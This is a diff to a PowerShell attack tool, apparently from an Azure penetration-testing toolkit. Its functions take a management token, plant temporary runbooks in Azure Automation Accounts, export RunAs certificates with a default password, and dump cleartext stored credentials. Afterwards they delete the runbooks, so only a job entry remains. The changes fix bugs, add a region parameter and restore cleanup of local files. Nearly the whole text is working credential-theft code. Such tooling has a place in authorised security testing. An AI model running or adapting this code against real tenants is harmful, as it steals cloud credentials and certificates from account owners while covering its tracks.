@@ -1,4 +1,4 @@
-﻿Function Get-AzAutomationAccountCredsREST {
+Function Get-AzAutomationAccountCredsREST {
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$false,
@@ -7,7 +7,11 @@
 
         [Parameter(Mandatory=$false,
         HelpMessage="The management scoped token")]
-        [string]$managementToken
+        [string]$managementToken,
+
+        [parameter(Mandatory=$false,
+        HelpMessage="Password to use for exporting the Automation certificates.")]
+        [String]$CertificatePassword = "TotallyNotaHardcodedPassword..."
 
     )
 
@@ -18,7 +22,6 @@
 
         # Select which subscriptions to dump info for
         $subChoice = $subscriptions | out-gridview -Title "Select One or More Subscriptions" -PassThru
-        $subChoice = $subscriptions[0]
         if($subChoice.count -eq 0){Write-Verbose 'No subscriptions selected, exiting'; break}
 
     }
@@ -65,22 +68,20 @@
         
     foreach($account in $automationAccounts)
     {
-
         $verboseName = $account.name
         $resourceGroup = $account.id.split("/")[4]
         $connections = ((Invoke-WebRequest -Uri (-join ("https://management.azure.com/subscriptions/",$SubscriptionId,"/resourceGroups/",$resourceGroup,"/providers/Microsoft.Automation/automationAccounts/",$account.name,"/connections?api-version=2015-10-31")) -Verbose:$false -Method GET -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).content | ConvertFrom-Json).value
-        #Write-Verbose $connections
         foreach($conn in $connections){
 
             $connection = ((Invoke-WebRequest -Uri (-join ("https://management.azure.com/subscriptions/",$SubscriptionId,"/resourceGroups/",$resourceGroup,"/providers/Microsoft.Automation/automationAccounts/",$account.name,"/connections/",$conn.name,"?api-version=2015-10-31")) -Verbose:$false -Method GET -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).Content)
                         
             #Need to use Select-Object here for some reason, otherwise it only returns the first field
-            $properties = (($connection | ConvertFrom-Json) | Select-Object -Property properties)
+            $properties = (($connection | ConvertFrom-Json).properties)
             
-           
-            $autoConnectionThumbprint = $properties.properties.fieldDefinitionValues.CertificateThumbPrint
-            $autoConnectionTenantId = $properties.properties.fieldDefinitionValues.TenantId
-            $autoConnectionApplicationId = $properties.properties.fieldDefinitionValues.ApplicationId
+            $autoConnectionName = ($connection | ConvertFrom-Json).name
+            $autoConnectionThumbprint = $properties.fieldDefinitionValues.CertificateThumbPrint
+            $autoConnectionTenantId = $properties.fieldDefinitionValues.TenantId
+            $autoConnectionApplicationId = $properties.fieldDefinitionValues.ApplicationId
             $jobName = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
             "`$RunAsCert = Get-AutomationCertificate -Name 'AzureRunAsCertificate'" | Out-File -FilePath "$pwd\$jobName.ps1" 
             "`$CertificatePath = Join-Path `$env:temp $verboseName-AzureRunAsCertificate.pfx" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
@@ -155,7 +156,8 @@
 
                     $jobList2 += @($jobName2)
                 }
-            }  
+            }
+        }  
         
         
         
@@ -164,14 +166,20 @@
         
         if ($jobList.Count -ne $null){
                 $connectionIter = 0
+            
                 while ($connectionIter -lt ($jobList.Count)){
                     $jobName = $jobList[$connectionIter]
                     $runAsName = $jobList[$connectionIter+1]
 
+                    $connectionIter += 2
+
+                    Write-Output $jobName
+                    Write-Output $runAsName
+
                     Write-Output "`tGetting the RunAs certificate for $verboseName using the $jobName.ps1 Runbook"
                     try{
                            
-                        $jobOutput = Invoke-AzRunbook -subscriptionId $SubscriptionId -managementToken $managementToken -automationAccount $account.name -targetScript $pwd\$jobName.ps1 -resourceGroupId $account.id.split("/")[4]
+                        $jobOutput = Invoke-AzRunbook -subscriptionId $SubscriptionId -managementToken $managementToken -automationAccount $account.name -targetScript $pwd\$jobName.ps1 -resourceGroupId $account.id.split("/")[4] -region $account.location
                         
                         # if execution errors, delete the AuthenticateAs- ps1 file
                         if($jobOutput.Exception){
@@ -193,12 +201,15 @@
                         Write-Output "`t`tRemoving $jobName runbook from $verboseName Automation Account"
                         
                     }
-                    Catch{Write-Output "`tUser does not have permissions to import Runbook"}
+                    Catch{
+                    Write-Output "`tUser does not have permissions to import Runbook"
+                    Write-Host $_
+                    }
 
-                    # Clean up local temp files
-                    #Remove-Item -Path $pwd\$jobName.ps1 | Out-Null
+                    #Clean up local temp files
+                    Remove-Item -Path $pwd\$jobName.ps1 | Out-Null
 
-                    $connectionIter += 2
+                    
                 }
             }
             
@@ -217,7 +228,7 @@
                         
                             Write-Output "`t`tGetting cleartext credentials for $subName using the $jobToRun.ps1 Runbook"             
 
-                            $jobOutput = Invoke-AzRunbook -subscriptionId $SubscriptionId -managementToken $managementToken -automationAccount $account.name -targetScript $pwd\$jobToRun.ps1 -resourceGroupId $account.id.split("/")[4]
+                            $jobOutput = Invoke-AzRunbook -subscriptionId $SubscriptionId -managementToken $managementToken -automationAccount $account.name -targetScript $pwd\$jobToRun.ps1 -resourceGroupId $account.id.split("/")[4] -region $account.location
                             # If there was an actual cred here, get the output and add it to the table                    
                             
                             #Kinda a hack. Should loop back around to this.
@@ -232,7 +243,10 @@
 
                             Write-Output "`t`t`tRemoving $jobToRun runbook from $verboseName Automation Account"
                         }
-                        Catch{Write-Verbose "`tUser does not have permissions to import Runbook"}
+                        Catch{
+                        Write-Verbose "`tUser does not have permissions to import Runbook"
+                        Write-Verbose $_
+                        }
                         
                         # Clean up local temp files
                         Remove-Item -Path $pwd\$jobToRun.ps1 | Out-Null
@@ -240,9 +254,9 @@
                 }
             }
         }
-    }
     Write-Output $TempTblCreds
-}
+    }
+    
 
 
 #This function will run a local PowerShell script in a designated Automation Account. A new Runbook draft will be created, published, ran, and deleted. A job will persist in the "Jobs" tab.
@@ -258,6 +272,10 @@ Function Invoke-AzRunbook {
     [Parameter(Mandatory=$true,
     HelpMessage="The target automation account")]
     [string]$automationAccount,
+
+    [Parameter(Mandatory=$true,
+    HelpMessage="The region that the account is in")]
+    [string]$region,
 
     [Parameter(Mandatory=$false,
     HelpMessage="The name of the runbook. Defaults to random.")]
@@ -283,7 +301,7 @@ Function Invoke-AzRunbook {
           
     #If we create a draft we can input the content directly instead of needing to host a file.
     Write-Verbose "Creating draft runbook..."
-    $draftBody = -join ('{"properties":{"runbookType":"PowerShell","draft":{}},"name":"',$runbookName,'","location":"eastus"}')
+    $draftBody = -join ('{"properties":{"runbookType":"PowerShell","draft":{}},"name":"',$runbookName,'","location":"', $region, '"}')
     $createDraft= ((Invoke-WebRequest -Uri (-join ('https://management.azure.com/subscriptions/',$subscriptionId,'/resourceGroups/',$resourceGroupId,'/providers/Microsoft.Automation/automationAccounts/',$automationAccount,'/runbooks/',$runbookName,'?api-version=2015-10-31')) -Verbose:$false -ContentType "application/json" -Method PUT -Body $draftBody -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).Content | ConvertFrom-Json).value
     
     Write-Verbose "Replacing script content..."
